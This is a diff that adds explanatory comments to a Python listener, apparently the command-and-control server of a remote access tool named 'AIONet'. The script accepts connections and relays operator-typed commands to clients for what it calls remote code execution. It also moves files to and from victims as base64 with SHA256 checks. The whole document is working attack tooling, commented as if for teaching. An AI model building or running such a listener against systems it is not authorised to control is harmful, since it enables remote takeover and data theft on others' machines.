@@ -1,3 +1,4 @@
+# Import required libraries
 import argparse
 import base64
 import hashlib
@@ -8,17 +9,23 @@ import sys
 import threading
 
 
+# Create a class for the server (listener)
 class Server:
+	# Define constructor with port as argument
 	def __init__(self,port):
+		# Set host to 0.0.0.0 to accept all IPs linked to the host
+		# Set port to the one specified during object instantiation
 		self.host = "0.0.0.0"
 		self.port = port
 		
+		# Create a socket object, bind it to the host, listen for connections and inform the user
 		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		listener.bind((self.host,self.port))
 		listener.listen(5)
 		print(f"Listening on {self.host}:{self.port}")
 
+		# Accept connections and create a separate thread for each connection
 		while True:
 			self.connection, self.address = listener.accept()
 			print()
@@ -27,74 +34,104 @@ class Server:
 			ct.start()
 	
 
+	# Define method to handle connections
 	def handle(self):
+		# Infinite loop to handle connections
 		while True:
+			# Provide shell prompt and receive input
 			command = input("AIONet > ")
 
+			# Check if upload command was used (append a new-line sentinel no matter the command)
 			if command[0:6] == "upload":
+				# Use the upload_file function to get base64 file and SHA256 hash
 				content,chash = self.upload_file(command)
+				# Create the bytes object to be sent
 				command = bytes(command, "utf-8") + b' ' + content + b' ' + chash +b'\n'
 			else:
 				command += "\n"
 
+			# If exit command received, inform the client and close the connection
 			if command == "exit\n":
 				print(f"Closing connection to {self.address[0]}")
 				self.connection.send(bytes(command, "utf-8"))
 				print("Connection closed")
 				sys.exit(0)
 
+			# Get the response using the Remote Code Execution (RCE) function
 			response = self.rce(command)
 
+			# If download command is run, call the download_file function
 			if type(command) is not bytes:
 				if command[0:8] == "download":
 					response = self.download_file(command, response)
 				
+			# Print the response received
 			print(response)
 
 
+	# Define function to download files from a client
 	def download_file(self, command, response):
+		# Get the filename from the second part of the input
 		path = str(command).split(" ")[1].rstrip()
+		# Use the response to get the base64 file and its hash
 		response = response.split(" ")
 		received = response[0].strip()
 		content = response[1].strip()
 		try:
 			with open(path,"wb") as dl_file:
+				# Decode the base64 content
 				dec_content = base64.b64decode(content)
+				# Find the hash on the local machine
 				local = hashlib.sha256(dec_content).hexdigest()
+				# If the hashes match, write the file and return a success message
 				if received == local:
 					dl_file.write(dec_content)
 					dl_file.close()
 					return f"Downloaded {path}\nSHA256 hash verified:\nReceived: {received}\nLocal:    {local}\n"
 				else:
+					# Raise a hash verification failed exception
 					raise Exception("Hash verification failed.")
 		except Exception as e:
+			# Catch any exceptions, remove the file (if created) and return the error message
 			os.remove(path)
 			return f"Download failed: {str(e)}\n"
 
 	
+	# Define method to upload files to the client
 	def upload_file(self, command):
+		# Get the file name from the second part of the input
 		path = command.split(" ")[1]
 		with open(path, "rb") as up_file:
+			# Read the file and hash its contents
 			content = up_file.read()
 			content_hash = hashlib.sha256(content).hexdigest()
+			# Convert the hash and contents to bytes
 			if type(content) is not bytes:
 				content = bytes(content, "utf-8")
 			if type(content_hash) is not bytes:
 				content_hash = bytes(content_hash, "utf-8")
+			# Return hash and base64 encoded contents
 			return base64.b64encode(content), content_hash
 	
 	
+	# Define method to executre commands remotely
 	def rce(self, command):
+		# Convert command to bytes
 		if type(command) is not bytes:
 			command = bytes(command, "utf-8")
+		# Send the command to the client
 		self.connection.send(command)
 
+		# Create a response string
 		response = "\n"
+		# Receive data in chunks and append to the response string till the \0 sentinel is received
 		while response[-1] != "\x00":
 			data = self.connection.recv(4096)
 			response += data.decode("utf-8")
+		# Strip the leading and trailing whitespace/new-line
 		response.strip()
 
+		# Return the response
 		return response
 
 
